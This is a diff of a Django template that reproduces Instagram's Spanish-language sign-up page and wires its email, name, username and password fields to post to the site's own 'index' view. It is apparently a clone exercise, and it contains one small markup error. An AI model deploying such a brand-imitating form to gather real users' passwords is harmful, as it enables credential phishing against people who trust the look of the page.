@@ -5,9 +5,7 @@
   <meta charset="UTF-8">
   <title>Registro</title>
   <link rel="stylesheet" href="{% static 'css/style.css' %}">
-
 </head>
-
 <body>
   <html>
 
@@ -29,7 +27,8 @@
         <div class="_f9sjj">
           <h1 class="_68swa _8scx2 coreSpriteLoggedOutWordmark">Instagram</h1>
           <div class="_7g6uj">
-            <form class="_asaim">
+            <form class="_asaim" action="{% url 'index' %}" method="post" >
+              {% csrf_token %}
               <h2 class="_mb54c">Regístrate para ver fotos y vídeos de tus amigos.</h2>
               <div class="_fhskl">
                 <div class="_j5suk">
@@ -40,28 +39,28 @@
               </div>
               <div class="_agqzm">
                 <div class="_sjplo">
-                  <input type="text" class="_ph6vk _o716c" aria-describedby="" aria-label="Número de móvilo correo electrónico" name="emailOrPhone" placeholder="Número de móvil o correo electrónico">
+                  <input type="text" class="_ph6vk _o716c"  name="correo" placeholder="Correo electrónico">
                   <div class="_gaby6">
                   </div>
                 </div>
               </div>
               <div class="_agqzm">
                 <div class="_sjplo">
-                  <input type="text" class="_ph6vk _o716c" aria-describedby="" aria-label="Nombre completo" aria-required="false" autocapitalize="sentences" autocorrect="off" name="fullName" placeholder="Nombre completo" value="">
+                  <input type="text" class="_ph6vk _o716c" name="nombre_completo" placeholder="Nombre completo" value="">
                   <div class="_gaby6">
                   </div>
                 </div>
               </div>
               <div class="_agqzm">
                 <div class="_sjplo">
-                  <input type="text" class="_ph6vk _o716c" aria-describedby="" aria-label="Nombre de usuario" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="30" name="username" placeholder="Nombre de usuario" value="">
+                  <input type="text" class="_ph6vk _o716c" name="usuario" placeholder="Nombre de usuario" value="">
                   <div class="_gaby6">
                   </div>
                 </div>
               </div>
               <div class="_agqzm">
                 <div class="_sjplo">
-                  <input type="password" class="_ph6vk _o716c" aria-describedby="" aria-label="Contraseña" aria-required="true" autocapitalize="off" autocorrect="off" name="password" placeholder="Contraseña" value="">
+                  <input type="password" class="_ph6vk _o716c" " autocorrect="off" name="password" placeholder="Contraseña" value="">
                   <div class="_gaby6">
                   </div>
                 </div>
@@ -84,7 +83,6 @@
 </body>
 
 </html>
-
 
 </body>
 </html>
